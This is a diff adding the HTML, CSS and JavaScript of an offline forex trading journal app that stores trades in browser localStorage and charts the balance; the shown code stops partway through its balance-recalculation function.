@@ -1,0 +1,1408 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Trading Journal</title>
+    <style>
+      /* ===== Reset and Base Styles ===== */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Inter", "Segoe UI", sans-serif;
+      }
+      
+      body {
+        background: #121212;
+        color: #e0e0e0;
+        line-height: 1.6;
+        font-size: 15px;
+        padding-bottom: 0vh; /* spacing for navbar */
+      }
+      
+      /* ===== Trade Form Layout (CSS Grid) ===== */
+      #tradeForm {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        grid-template-rows: repeat(6, 1fr);
+        gap: 0.5em;
+        height: max-content;
+      }
+      
+      /* Positioning grid items */
+      .div1 { grid-area: 1 / 1 / 2 / 2; height: 7vh; }
+      .div2 { grid-area: 1 / 2 / 2 / 3; height: 7vh; }
+      .div3 { grid-area: 1 / 3 / 2 / 4; height: 7vh; }
+      .div4 { grid-area: 2 / 1 / 3 / 4; }
+      .div5 { grid-area: 3 / 1 / 4 / 2; }
+      .div6 { grid-area: 4 / 1 / 5 / 2; }
+      .div7 { grid-area: 5 / 1 / 6 / 2; }
+      .div8 { grid-area: 3 / 2 / 6 / 3; }
+      .div9 { grid-area: 3 / 3 / 6 / 4; display: grid; height: 10vh; }
+      .div10 { grid-area: 6 / 1 / 7 / 4; }
+      
+      /* Shared height */
+      .div1, .div2, .div3, .div4, .div5,
+      .div6, .div7, .div8, .div9, .div10 {
+        height: 7vh;
+      }
+      
+      /* Align radio buttons */
+      .div2, .div3 {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      
+      .pnl { margin-top: 6vh; }
+      
+      /* Notes textarea with styled scrollbar */
+      #notes {
+        height: 23vh;
+        color: #c3fff2;
+        border: 1px solid #00ffc6;
+        background-color: inherit;
+      }
+      
+      #notes::-webkit-scrollbar {
+        width: 3px;
+      }
+      #notes::-webkit-scrollbar-thumb {
+        background-color: #00cc9a;
+        border-radius: 50px;
+        border: 2px solid rgb(0,0,0);
+        box-shadow: 0 0 15px #00cc9a;
+      }
+      #notes::-webkit-scrollbar-track {
+        background-color: inherit;
+        border: 1px solid #00ffc6;
+        border-radius: 50px;
+      }
+      
+      /* Inputs and selects */
+      #tradeDate, textarea {
+        color: #c3fff2;
+        border: 1px solid #00ffc6;
+        font-size: 1.2rem;
+        outline: none;
+        width: 100%;
+        height: 5vh;
+      }
+      
+      #buy, #sell, #profit, #loss {
+        width: 3vw;
+        cursor: pointer;
+        margin: 0 1vw;
+        color:#c3fff2;
+      }
+      
+      input, #asset {
+        width: 100%;
+        padding: 12px 16px;
+        background: transparent;
+        border: 1px solid #00cc9a;
+        border-radius: 8px;
+        color: #c3fff2;
+        font-size: 15px;
+        outline: none;
+        margin: auto;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      
+      /* Labels for Buy/Sell/Profit/Loss */
+      .sellL, .buyL, #lossL, #profitL {
+        width: 100%;
+        height: 5vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        border-radius: 10px;
+        cursor: pointer;
+        color: white;
+      }
+      .buyL, #profitL {
+        background-color: #1f71eb9f;
+        border: 1px solid #1f6feb;
+      }
+      .sellL, #lossL {
+        border: 1px solid red;
+        background-color: #dc3545;
+      }
+      
+      #radio-group { gap: 20px; }
+      .pnl { display: grid; }
+      
+      /* Section paddings */
+      #dashboard { padding-bottom: 11vh; }
+      #settings, #addEntry, #history { padding-bottom: 11vh; }
+   
+      /* ===== Splash Screen ===== */
+      #splash {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        background: #000814;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+      }
+      #splash img {
+        width: 120px;
+        filter: drop-shadow(0 0 20px #0ff);
+        opacity: 0;
+        transform: scale(0.9);
+        animation: logoFadeIn 1.5s forwards;
+      }
+      @keyframes logoFadeIn {
+        to { opacity: 1; transform: scale(1); }
+      }
+      #splash h1 {
+        margin-top: 20px;
+        font-size: 2rem;
+        color: #00ffe5;
+        text-shadow: 0 0 10px #0ff, 0 0 20px #0ff;
+        white-space: nowrap;
+        border-right: 2px solid #00ffe5;
+        width: 0ch;
+        overflow: hidden;
+        animation: typing 2s steps(7) forwards;
+        animation-delay: 1.5s;
+      }
+      @keyframes typing {
+        from { width: 0ch; }
+        to { width: 7ch; } /* "D-LogiX" */
+      }
+      .fade-out { animation: fadeOut 1s forwards; }
+      @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
+      
+      /* ===== Header ===== */
+      header {
+        text-align: center;
+        padding: 0,5rem;
+        background: #1f1f1f;
+        color: #00ffc6;
+        font-size: 1.4rem;
+        font-weight: 600;
+        border-bottom: 1px solid #2c2c2c;
+      }
+      
+      /* ===== Main Sections ===== */
+      main { padding: 1rem; }
+      .hidden { display: none; }
+      
+      /* ===== Navbar ===== */
+      .navbar {
+        position: fixed;
+        bottom: 0; left: 0; right: 0;
+        display: flex;
+        justify-content: space-around;
+        align-items: center;
+        background: #1f1f1f;
+        border-top: 1px solid #2c2c2c;
+        padding: 0.rem 0;
+        z-index: 999;
+      }
+      .navbar button {
+        background: none;
+        border: none;
+        color: #ccc;
+        font-size: 1.5rem;
+        cursor: pointer;
+        transition: color 0.3s ease;
+      }
+      .navbar button:hover { color: #00ffc6; }
+      
+      /* ===== Cards ===== */
+      .card {
+        background: #1e1e1e;
+        padding: 1rem;
+        margin: 0.8rem 0;
+        border-radius: 12px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+        color: #c3fff2;
+        transition: transform 0.2s ease, box-shadow 0.2s ease;
+      }
+      #greeting{
+        font-size: 2rem;
+        background: inherit;
+        padding:0 1vh;
+      }
+      .card:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 6px 18px rgba(0,0,0,0.5);
+      }
+      
+      /* Trade cards with expand details */
+      .trade-card { cursor: pointer; }
+      .trade-card.profit { border-left: 6px solid #28a745; }
+      .trade-card.loss { border-left: 6px solid #dc3545; }
+      .trade-card.expanded .details { display: block; }
+      
+      .details {
+        display: none;
+        margin-top: 0.5rem;
+        font-size: 0.9rem;
+        color: #aaa;
+      }
+      
+      /* Chart styling */
+      canvas {
+        width: 100%; height: 220px;
+        background: #1e1e1e;
+        border-radius: 12px;
+        box-shadow: 0 3px 8px rgba(0,0,0,0.4);
+        margin-top: 0.8rem;
+        display: block;
+      }
+      
+      /* Inputs, selects, buttons */
+      input, select, textarea, button {
+        width: 100%;
+        padding: 0.6rem;
+        margin: 0.4rem 0;
+        border: 1px solid #333;
+        border-radius: 8px;
+        background: #2a2a2a;
+        color: rgb(148,148,148);
+        font-size: 0.95rem;
+        transition: border-color 0.3s ease, background 0.3s ease;
+      }
+      input:focus, select:focus, textarea:focus {
+        outline: none;
+        border-color: #00ffc6;
+        background: #1e1e1e;
+      }
+      textarea { resize: vertical; min-height: 80px; }
+      
+      /* Save button */
+      button.save-btn {
+        background: #00ffc6;
+        color: #121212;
+        border: none;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      button.save-btn:hover { background: #00cc9a; }
+      
+      /* Action buttons in history */
+      .action-buttons {
+        margin-top: 0.6rem;
+        display: flex;
+        gap: 0.6rem;
+      }
+      .action-buttons button {
+        flex: 1;
+        padding: 0.6rem;
+        border: none;
+        border-radius: 6px;
+        color: #fff;
+        cursor: pointer;
+        font-weight: 500;
+      }
+      .edit-btn { background: #28a745; }
+      .edit-btn:hover { background: #218838; }
+      .delete-btn { background: #dc3545; }
+      .delete-btn:hover { background: #c82333; }
+      
+      /* ===== Settings Page ===== */
+      #settings h3 { font-size: 1.3rem; color: #00ffc6; }
+      #settings h4, #settings h5 {
+        margin-top: 0.8rem;
+        margin-bottom: 0.4rem;
+        color: #ccc;
+      }
+      #assetList {
+        background: #1e1e1e;
+        padding: 0.8rem;
+        border-radius: 8px;
+        margin-top: 0.6rem;
+      }
+      #assetList div {
+        padding: 0.4rem 0;
+        border-bottom: 1px solid #2c2c2c;
+        color: #aaa;
+      }
+      #assetList div:last-child { border-bottom: none; }
+      
+      /* ===== Quotes Section ===== */
+ 
+      #quote { 
+        transition: font-size 0.3s ease, opacity 0.5s ease;
+        background: #1e1e1e00;
+        padding: 1rem;
+        margin: 0.8rem 0;
+        border-radius: 12px;
+        box-shadow: none;
+        color: #5a7770;
+        transition: transform 0.2s ease, box-shadow 0.2s ease;
+      } 
+
+
+       .contact{
+              display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        grid-template-rows: repeat(3, 1fr);
+        gap: 5px 5px;
+        margin-top: 2vh;
+       }
+       .contact a{
+         text-decoration: none;
+         color: white;
+       }
+        .abt{
+          grid-area: 1 / 1 / 2 / 2;
+        }
+        .terms{
+          grid-area: 1 / 2 / 2 / 3;
+        }
+        .con{
+          grid-area: 2 / 1 / 3 / 3;
+        }
+        .owner{
+          grid-area: 3 / 1 / 4 / 3;
+        }
+      #abt, #terms , .con , .owner{
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        border: 2px solid #00ffc6;
+        border-radius: 10px;
+      }
+
+
+
+         /* Modal Trigger Button Style */
+    .modal-trigger {
+     
+      cursor: pointer;
+    }
+
+    /* Modal Background Overlay */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.4);
+      display: none;
+      z-index: 99;
+    }
+
+    .modal-content {
+      position: absolute;
+      bottom: -100%;
+      left: 0;
+      width: 100%;
+      height: 60%;
+      background-color: white;
+      border-top-left-radius: 20px;
+      border-top-right-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 -4px 10px rgba(0,0,0,0.2);
+      overflow-y: auto;
+      transition: bottom 0.3s ease;
+      color: black;
+    }
+    .modal-content::-webkit-scrollbar {
+        width: 3px;
+      }
+      .modal-content::-webkit-scrollbar-thumb {
+        background-color: #00cc9a;
+        border-radius: 50px;
+        border: 2px solid rgb(0,0,0);
+        box-shadow: 0 0 15px #00cc9a;
+      }
+      .modal-content::-webkit-scrollbar-track {
+        background-color: inherit;
+        border: 1px solid #00ffc6;
+        border-radius: 50px;
+      }
+    .modal-content{ padding-bottom: 13vh; }
+    /* Show Modal */
+    .modal-overlay.active {
+      display: block;
+    }
+
+    .modal-content.active {
+      bottom: 0;
+    }
+
+
+
+    #balance, #balancedoll{
+      font-size: 2rem;
+    }
+      /* Select dropdowns */
+      select option { color: #00cc9a; }
+      
+      /* ===== Responsive ===== */
+      @media (max-width: 768px) {
+        header { font-size: 1.2rem; }
+        .navbar button { font-size: 1.3rem; }
+        .card { padding: 0.8rem; }
+      }
+      </style>
+ 
+  </head>
+  <body>
+        <!-- Splash Screen -->
+       
+<div id="splash">
+    <img src="logo.png" alt="Logo">
+    <h1 id="appName">D-LogiX</h1>
+  </div> 
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const splash = document.getElementById("splash");
+      const mainContent = document.getElementById("main-content");
+
+      // Check if splash was shown already in this session
+      if (sessionStorage.getItem("splashShown")) {
+        splash.style.display = "none";
+        mainContent.style.display = "block";
+        document.body.style.overflow = "auto";
+        return;
+      }
+
+      // Hold splash for 3 seconds, then fade out
+      setTimeout(() => {
+        splash.classList.add("fade-out");
+        setTimeout(() => {
+          splash.style.display = "none";
+          mainContent.style.display = "block";
+          document.body.style.overflow = "auto";
+          sessionStorage.setItem("splashShown", "true");
+        }, 1000); // match fade-out duration
+      }, 4000);
+    });
+  </script>
+    <header>Trading Journal</header>
+
+    <main>
+      <!-- Dashboard -->
+      <section id="dashboard">
+        <div class="card" id="greeting"></div>
+
+   
+
+        <div class="card" id="quote"></div>
+        <div class="card">Account Balance <br> <b id="balancedoll">$</b><span id="balance">0</span></div>
+         <!-- Placeholder for Update Button -->
+   <div id="updateButtonContainer"></div>
+        <canvas id="balanceChart"></canvas>
+        <button class="save-btn" onclick="showSection('addEntry')">
+          Add Entry
+        </button>
+      </section>
+
+      <!-- Add Entry -->
+      <section id="addEntry" class="hidden">
+        <h3 id="formTitle">Add Trade</h3>
+        <form id="tradeForm">
+          <div class="div1" id="radio-group">
+            <input type="date" id="tradeDate" required />
+          </div>
+
+          <div class="div2" id="radio-group">
+            <label class="buyL"
+              ><input type="radio" name="type" value="Buy" required id="buy" />
+              Buy</label
+            >
+          </div>
+
+          <div class="div3" id="radio-group">
+            <label class="sellL"
+              ><input type="radio" name="type" value="Sell" id="sell" />
+              Sell</label
+            >
+          </div>
+
+          <div class="div4"><select id="asset"></select></div>
+
+          <div class="div5">
+            <input
+              type="number"
+              step="0.0001"
+              id="entry"
+              placeholder="Entry price" required
+            />
+          </div>
+
+          <div class="div6">
+            <input
+              type="number"
+              step="0.0001"
+              id="tp"
+              placeholder="Take Profit" required
+            />
+          </div>
+
+          <div class="div7">
+            <input
+              type="number"
+              step="0.0001"
+              id="sl"
+              placeholder="Stop Loss"
+            />
+          </div>
+
+          <div class="div8">
+            <textarea id="notes" placeholder="Trade reason" ></textarea>
+          </div>
+
+          <div class="div9">
+            <div id="radio-group" class="pnl">
+              <label id="profitL"
+                ><input
+                  type="radio"
+                  name="result"
+                  value="Profit"
+                  required
+                  id="profit"
+                />
+                Profit</label
+              >
+              <label id="lossL"
+                ><input type="radio" name="result" value="Loss" id="loss" />
+                Loss</label
+              >
+            </div>
+          </div>
+
+          <div class="div10">
+            <div class="">
+              <input type="number" step="0.01" id="pnl" placeholder="Amount" required/>
+            </div>
+            <div class="">
+              <button type="submit" class="save-btn" id="submitBtn">
+                Save Trade
+              </button>
+            </div>
+          </div>
+        </form>
+      </section>
+
+      <!-- History -->
+      <section id="history" class="hidden">
+        <h3>Trade History</h3>
+        <div id="tradeList"></div>
+      </section>
+
+      <!-- Settings -->
+      <section id="settings" class="hidden">
+        <h3>Settings</h3>
+        <input id="nickname" placeholder="Enter your name" />
+        <input
+          type="number"
+          id="startingBalance"
+          placeholder="Starting Balance"
+        />
+ 
+
+        <textarea
+          id="quotesInput"
+          placeholder="Enter quotes, one per line"
+        ></textarea>
+
+
+
+        <button onclick="saveSettings()" class="save-btn">Save Settings</button>
+     
+        <hr />
+        <button onclick="exportTrades()" class="save-btn">
+          Export Trades (CSV)
+        </button>
+        <input
+          type="file"
+          id="importFile"
+          accept=".csv"
+          onchange="importTrades(event)"
+        />
+        <hr />
+        <h4>Add New Currency Pair</h4>
+        <input id="newAsset" placeholder="e.g. USDJPY" />
+        <button onclick="addAsset()" class="save-btn">Add Pair</button>
+        <div id="assetList"></div>
+
+
+
+
+        <div class="">
+
+
+          <div class="contact">
+            <!-- Modal Trigger 1 -->
+          <div id="abt"  class="modal-trigger" onclick="openModal('modal1')">About & Guide</div>
+            <!-- Modal Trigger 2 -->
+          <div id="terms"  class="modal-trigger" onclick="openModal('modal2')">Terms & Cons</div>
+         <a href="https://wa.me/+2348087517272?text=Hí" class="con"> <div >Contact</div></a>
+          <a href="https://markohio.github.io/Portfolio-/" class="owner"><div class=" "> designed by <b>Mark Ohio</b>  
+        </div> </a>
+  <!-- Modal Structure1 -->
+  <div id="modal1" class="modal-overlay" onclick="closeModal(event, 'modal1')">
+    <div class="modal-content">
+      <h2>About the App</h2>
+
+      <p>
+        Created in <b>August 2025</b> by developer <b>Mark O. Ohio</b>, this trading journal app was born out of a simple frustration — the lack of a decent, free, and offline solution for logging trades.
+        <br><br>
+        As a trader himself, Mark built the app with one clear goal: to help both himself and other <b>Forex</b> and <b>Volatility</b> traders monitor their progress easily, privately, and without hassle.
+      </p>
+    
+      <h3>Why This App?</h3>
+      <p>
+        The app is <b>lightweight</b>, <b>beginner-friendly</b>, and incredibly <b>fast</b> thanks to its fully offline design.
+        <br><br>
+        It requires <b>no internet connection</b>, <b>no account creation</b>, and <b>does not back up or share your data</b> — everything stays on your device, giving you complete privacy and control.
+        <br><br>
+        Its clean and straightforward interface lets you <b>log trades quickly</b> and <b>revisit them with ease</b>.
+        <br><br>
+        You’ll be able to <b>track which strategies are working</b> and which aren’t, using <b>simple visual charts</b> and <b>profit/loss indicators</b>.
+        <br><br>  It even adds a personal touch with interactive messages like <i>“Good morning, John”</i> — yes, you can <b>set your own username</b>.
+      </p>
+    
+      <h3>Who It's For</h3>
+      <p>
+        This app is made for <b>Forex traders</b> and <b>Volatility traders</b> who need a clean, efficient, and private way to record and track their trades.
+      </p>
+    
+      <h3>Features</h3>
+      <ul>
+        <li>Fully <b>offline and free</b> to use</li>
+        <li><b>Simple charts</b> that show your progress</li>
+        <li>Analyze which <b>strategies lead to wins or losses</b></li>
+        <li><b>Personalized greetings</b> and username setting</li>
+        <li><b>Fast and lightweight</b> experience</li>
+      </ul>
+    
+      <h3>Looking Ahead</h3>
+      <p>
+        We’re committed to growing this app alongside our users.
+        <br><br>
+        Got a feature you’d love to see? <b>Drop a review</b> or send feedback — <b>we’re listening</b>.
+      </p> <br> <br>
+      <h3>User Guide: How to Use the Trading Journal</h3>
+
+      <p><b>Welcome!</b> This guide explains every part of the Trading Journal so anyone— even a first-time user—can use it confidently. The journal is for <b>educational purposes only</b>. It helps you <b>record your trades</b>, <b>track balance changes</b>, and <b>review history</b>. It does not provide trading advice.</p>
+    
+      <h3>1) What you need</h3>
+      <p>
+        <b>A device:</b> Phone, tablet etc.<br>
+        <b>No account needed:</b> Your data is saved in your browser (on your device).<br>
+        <b>Privacy:</b> The app does <b>not</b> send your data to a server.
+      </p>
+    
+      <h3>2) The screen layout</h3>
+      <p>
+        The page has a main area and a bottom <b>navigation bar</b> with four buttons:
+      </p>
+      <ul>
+        <li>
+          <img src="dash.png" alt="Dashboard Icon" width="20" height="20">
+          <b>Dashboard</b> – shows your greeting, the current quote, your current balance, and a balance chart.
+        </li>
+        <li>
+          <img src="add.png" alt="Add Entry Icon" width="20" height="20">
+          <b>Add Entry</b> – where you record a new trade (or edit one).
+        </li>
+        <li>
+          <img src="history.png" alt="History Icon" width="20" height="20">
+          <b>History</b> – where all saved trades are listed and can be expanded.
+        </li>
+        <li>
+          <img src="settings.png" alt="Settings Icon" width="20" height="20">
+          <b>Settings</b> – where you set your name, starting balance, manage quotes, export/import data, and add assets.
+        </li>
+      </ul>
+    
+      <h3>3) First setup (recommended)</h3>
+      <ol>
+        <li>Tap <b>Settings</b>.</li>
+        <li>In <b>Nickname</b>, type your name (optional). The greeting on the Dashboard will use this.</li>
+        <li>In <b>Starting Balance</b>, enter the amount you want to begin tracking from (e.g., <i>1000</i>).</li>
+        <li>Press <b>Save Settings</b>. Your choices are saved to your device.</li>
+        <li>Tap <b>Dashboard</b> to return.</li>
+      </ol>
+    
+      <h3>4) Adding a trade</h3>
+      <ol>
+        <li>Tap <b>Add Entry</b>.</li>
+        <li>Choose the <b>Date</b> of your trade.</li>
+        <li>Select whether it is a <b>Buy</b> or <b>Sell</b>.</li>
+        <li>Choose the <b>Asset</b> (e.g., EURUSD). If your pair is missing, you can add it later in Settings.</li>
+        <li>Optionally fill in <b>Entry</b>, <b>Take Profit (TP)</b>, and <b>Stop Loss (SL)</b>.</li>
+        <li>In the <b>notes</b> box, write the reason for the trade or any details you want to remember.</li>
+        <li>Select the result: <b>Profit</b> or <b>Loss</b>.</li>
+        <li>Enter the <b>Amount</b> won or lost (numbers only). If you pick “Loss,” the app will make it negative automatically.</li>
+        <li>Tap <b>Save Trade</b>. The trade is saved, balances are recalculated, and you’ll return to the Dashboard.</li>
+      </ol>
+    
+      <p><b>Autosave while typing:</b> If you are writing in the notes box and leave the page or close the browser, your unsaved notes are kept on your device and will reappear when you return.</p>
+    
+      <h3>5) Viewing your Dashboard</h3>
+      <ul>
+        <li><b>Greeting:</b> Shows “Good Morning/Afternoon/Evening” and your nickname (if set).</li>
+        <li><b>Quote:</b> A motivational quote. It <b>updates automatically every 2 minutes</b>, even if you close the site and return later.</li>
+        <li><b>Balance:</b> Shows your current total after all saved trades.</li>
+        <li><b>Balance Chart:</b> A simple line chart of your balance over time.</li>
+      </ul>
+    
+      <h3>6) Reviewing and managing History</h3>
+      <ol>
+        <li>Tap <b>History</b> to see all trades (most recent first).</li>
+        <li>Tap a trade to <b>expand</b> it and see details (date, type, entry, TP, SL, and balance after).</li>
+        <li>Use <b>Edit</b> to load a trade back into the Add Entry form. Make your changes, then press <b>Update Trade</b>.</li>
+        <li>Use <b>Delete</b> to remove a trade. The app recalculates balances automatically.</li>
+      </ol>
+    
+      <h3>7) Settings in detail</h3>
+      <ul>
+        <li><b>Nickname</b> – Used for the greeting.</li>
+        <li><b>Starting Balance</b> – Sets the initial balance for your chart and totals.</li>
+        <li><b>Quotes</b> – You can paste your own quotes (one per line). Click <b>Save Settings</b> to store them.</li>
+        <li><b>Export Trades (CSV)</b> – Download your trades as a CSV file for backup or use in a spreadsheet.</li>
+        <li><b>Import Trades (CSV)</b> – Load trades from a CSV file into the app.</li>
+        <li><b>Add New Currency Pair</b> – Type a new pair (e.g., <i>USDJPY</i>) and click <b>Add Pair</b>. It appears in the asset list and the Add Entry dropdown.</li>
+      </ul>
+    
+      <h3>8) How saving works (important)</h3>
+      <p>
+        <b>Your data stays on your device.</b> The app uses your browser’s <b>Local Storage</b> to save:
+      </p>
+      <ul>
+        <li>Your profile (name, starting & current balance)</li>
+        <li>Your list of trades</li>
+        <li>Your asset list</li>
+        <li>Your quotes</li>
+        <li>The current quote and the time it was last set (to control the 2-minute change)</li>
+        <li>Work-in-progress notes (so you don’t lose them if you leave)</li>
+        <li>The last page you were viewing (so the app reopens to the same page)</li>
+      </ul>
+      <p>
+        If you clear your browser storage or use a different browser/device, your data won’t be there. To move data to another device, use <b>Export</b> on one device and <b>Import</b> on the other.
+      </p>
+    
+      <h3>9) Updating the app (if you see an update prompt)</h3>
+      <p>
+        Sometimes an invisible <b>update button</b> may appear (gently jiggling) when a new version is available. Tapping it will take you to an update page or link. If you don’t see it, there may be no updates right now.
+      </p>
+    
+      <h3>10) Tips for success</h3>
+      <ul>
+        <li>Record trades soon after you take them so your notes are fresh.</li>
+        <li>Use the notes field to capture your reasoning. This helps you learn over time.</li>
+        <li>Back up your data by exporting CSV regularly.</li>
+        <li>Customize quotes in Settings for motivation that works for you.</li>
+      </ul>
+    
+      <h3>11) Troubleshooting</h3>
+      <ul>
+        <li><b>I can’t see my old trades:</b> Make sure you’re using the same browser and device, and you haven’t cleared site data. If you have a CSV backup, import it in Settings.</li>
+        <li><b>The quote doesn’t change:</b> Wait up to 2 minutes, or switch away and return later. Ensure you have at least one quote in Settings.</li>
+        <li><b>The update button never appears:</b> There may not be an update, or your connection blocked the remote file. The app still works without the button.</li>
+        <li><b>Numbers look wrong after editing a trade:</b> The app recalculates balances automatically. If something seems off, review each trade’s <b>Amount</b> sign (Profit vs. Loss) and save again.</li>
+      </ul>
+    
+      <h3>12) Keyboard & accessibility notes</h3>
+      <ul>
+        <li>You can tab through inputs and press <b>Enter</b> to submit a trade.</li>
+        <li>Large buttons and simple layout make it easy to use on touch screens.</li>
+      </ul>
+    
+      <h3>13) Safety note</h3>
+      <p>
+        This app is an <b>educational journal</b>. It does <b>not</b> provide financial advice or trading signals. You are responsible for your own trades and decisions.
+      </p>
+    
+      <h3>14) Quick start (summary)</h3>
+      <ol>
+        <li>Open <b>Settings</b>, enter <b>Nickname</b> and <b>Starting Balance</b>, click <b>Save Settings</b>.</li>
+        <li>Go to <b>Add Entry</b>, fill the trade form, and <b>Save Trade</b>.</li>
+        <li>Check <b>Dashboard</b> for your balance and the 2-minute rotating quote.</li>
+        <li>Use <b>History</b> to review, edit, or delete trades.</li>
+        <li>Back up with <b>Export Trades (CSV)</b>.</li>
+      </ol>
+    
+      <p><b>You’re all set!</b> Use the journal daily to build a clear record of your trading journey.</p>
+    </div>
+  </div>
+ <!-- Modal Structure2 -->  
+  <div id="modal2" class="modal-overlay" onclick="closeModal(event, 'modal2')">
+    <div class="modal-content">
+      <h3>Terms and Conditions</h3>
+
+  <p><b>Owner:</b> This site is owned and operated by Mark O. Ohio.</p>
+
+  <p><b>Purpose:</b> This site is designed strictly for educational purposes. It does not provide trading signals, financial advice, or guidance. It functions solely as a personal trading journal to help you log and track your own trades and progress.</p>
+
+  <p><b>Liability Disclaimer:</b> By using this site, you agree that the owner and developer of this site shall not be held liable for any financial losses or damages you may incur. The site does not influence your trading decisions and cannot be held responsible for any outcomes resulting from your trading activities.</p>
+
+  <p><b>Data Storage:</b> All data you enter on this site is stored locally on your own device using browser storage. We do not collect, transmit, or store any personal information or trade data on external servers. Your information remains entirely under your control.</p>
+
+  <p><b>Age Requirement:</b> To use this site, you must be at least 18 years old, or the minimum legal age required to trade or engage in financial activities in your country of residence.</p>
+
+  <p><b>Jurisdiction:</b> These Terms and Conditions are applicable worldwide. As this site is intended only as a personal journal tool and does not collect personal data, no specific jurisdiction or governing law is applied.</p>
+
+  <p><b>Acceptance of Terms:</b> By using this site, you confirm that you have read, understood, and agreed to these Terms and Conditions. If you do not agree with any part of these Terms, you should discontinue use of the site.</p>
+    </div>
+  </div>
+        </div>
+        </div>
+  
+      </section>
+    </main>
+
+    <!-- Navbar -->
+    <div class="navbar">
+      <button onclick="showSection('dashboard')">  <img src="dash.png" alt="Dashboard Icon" width="30" height="30"></button>
+      <button onclick="showSection('addEntry')"> <img src="add.png" alt="Add Entry Icon" width="30" height="30"></button>
+      <button onclick="showSection('history')">  <img src="history.png" alt="History Icon" width="30" height="30"></button>
+      <button onclick="showSection('settings')">   <img src="settings.png" alt="Settings Icon" width="30" height="30"></button>
+    </div>
+    
+ 
+    
+    
+    <script>
+        // ===== Local Storage Helpers =====
+        function getData(key, fallback) {
+          return JSON.parse(localStorage.getItem(key)) || fallback;
+        }
+        function setData(key, value) {
+          localStorage.setItem(key, JSON.stringify(value));
+        }
+    
+        // ===== Initial Data =====
+        let userProfile = getData("userProfile", {
+          name: "",
+          startingBalance: 0,
+          currentBalance: 0,
+        });
+        let trades = getData("trades", []);
+        let assets = getData("assets", ["EURUSD", "GBPUSD", "XAUUSD"]);
+        let quotes = getData("quotes", [
+          "Discipline is the bridge between goals and accomplishment.",
+          "Trade what you see, not what you feel.",
+          "Risk comes from not knowing what you are doing.",
+        ]);
+        let quoteOfDay = getData("quoteOfDay", { quote: "", date: "" });
+        let balanceHistory = getData("balanceHistory", []);
+        let editingTradeId = null;
+    
+        // ===== Section Navigation =====
+        function showSection(id) {
+          document
+            .querySelectorAll("main section")
+            .forEach((sec) => sec.classList.add("hidden"));
+          document.getElementById(id).classList.remove("hidden");
+          if (id === "dashboard") renderDashboard();
+          if (id === "history") renderHistory();
+          if (id === "settings") renderAssets();
+        }
+    
+        // ===== Dashboard =====
+        function renderDashboard() {
+          const hours = new Date().getHours();
+          let greeting = "Hello";
+          if (hours < 12) greeting = "Good Morning";
+          else if (hours < 18) greeting = "Good Afternoon";
+          else greeting = "Good Evening";
+          document.getElementById("greeting").innerText = `${greeting}, ${
+            userProfile.name || "Trader"
+          }`;
+    
+          const today = new Date().toISOString().split("T")[0];
+          if (quoteOfDay.date !== today) {
+            const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
+            quoteOfDay = { quote: randomQuote, date: today };
+            setData("quoteOfDay", quoteOfDay);
+          }
+          document.getElementById("quote").innerText = quoteOfDay.quote;
+    
+          document.getElementById("balance").innerText = (
+            userProfile.currentBalance || 0
+          ).toFixed(2);
+          drawChart();
+        }
+    
+        function drawChart() {
+          const canvas = document.getElementById("balanceChart");
+          // set internal resolution to match displayed size for crisp rendering
+          canvas.width = canvas.clientWidth;
+          canvas.height = canvas.clientHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+    
+          if (!balanceHistory || balanceHistory.length < 2) return;
+    
+          const maxBalance = Math.max(...balanceHistory.map((b) => b.balance));
+          const minBalance = Math.min(...balanceHistory.map((b) => b.balance));
+          const range = maxBalance - minBalance || 1;
+    
+          ctx.beginPath();
+          balanceHistory.forEach((pt, i) => {
+            const x = (i / (balanceHistory.length - 1)) * canvas.width;
+            const y =
+              canvas.height - ((pt.balance - minBalance) / range) * canvas.height;
+            if (i === 0) ctx.moveTo(x, y);
+            else ctx.lineTo(x, y);
+          });
+          // stroke color depends on last movement (green if rising overall, red otherwise)
+          const lastDelta =
+            balanceHistory[balanceHistory.length - 1].balance -
+            balanceHistory[0].balance;
+          ctx.strokeStyle = lastDelta >= 0 ? "#28a745" : "#c82333";
+          ctx.lineWidth = 2;
+          ctx.stroke();
+    
+          // optional: draw points
+          ctx.fillStyle = "#2c3e50";
+          balanceHistory.forEach((pt, i) => {
+            const x = (i / (balanceHistory.length - 1)) * canvas.width;
+            const y =
+              canvas.height - ((pt.balance - minBalance) / range) * canvas.height;
+            ctx.beginPath();
+            ctx.arc(x, y, 2.5, 0, Math.PI * 2);
+            ctx.fill();
+          });
+        }
+    
+        // ===== Balance recompute helper =====
+        function recomputeAllBalances() {
+          // Determine initial balance
+          let initial = 0;
+          if (
+            typeof userProfile.startingBalance === "number" &&
+            userProfile.startingBalance
+          ) {
+            initial = userProfile.startingBalance;
+          } else if (
+            trades.length > 0 &&
+            typeof trades[0].balanceAfter === "number" &&
+            typeof trades[0].pnl === "number"
+          ) {
+            initial = trades[0].balanceAfter - trades[0].pnl;
+          } else {
+            initial = 0;
+          }
+    
+          let balance = initial;
+          // ensure trades are in array order (they are appended), recalc sequentially
+          balanceHistory = [];
+          for (let i = 0; i < trades.length; i++) {
+            const t = trades[i];
+            const pnl = Number(t.pnl) || 0;
+            balance += pnl;
+            t.balanceAfter = balance;
+            // preserve existing timestamp if available, else create one
+            const ts = t.timestamp || new Date().toISOString();
+            balanceHistory.push({
+              tradeId: t.id,
+              balance: balance,
+              timestamp: ts,
+            });
+          }
+    
